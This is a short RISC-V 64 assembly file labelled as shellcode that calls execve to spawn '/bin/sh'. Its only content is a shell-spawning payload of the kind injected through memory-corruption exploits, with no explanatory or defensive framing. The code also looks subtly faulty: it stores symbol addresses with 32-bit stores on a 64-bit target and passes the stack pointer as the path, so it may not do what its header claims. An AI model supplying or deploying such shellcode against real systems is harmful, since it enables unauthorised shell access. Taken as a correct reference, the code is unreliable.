#
# RISCV-64 sys_exec("/bin/sh") shellcode
#
#
lui a0, %hi(nib)
addi a0, a0, %lo(nib)
sw a0, 0(sp)
lui a0, %hi(hs)
addi a0, a0, %lo(hs)
sw a0, 4(sp)
mv a0, sp
xor a1, a1, a1
xor a2, a2, a2
li a7, __NR_SYS_execve
ecall
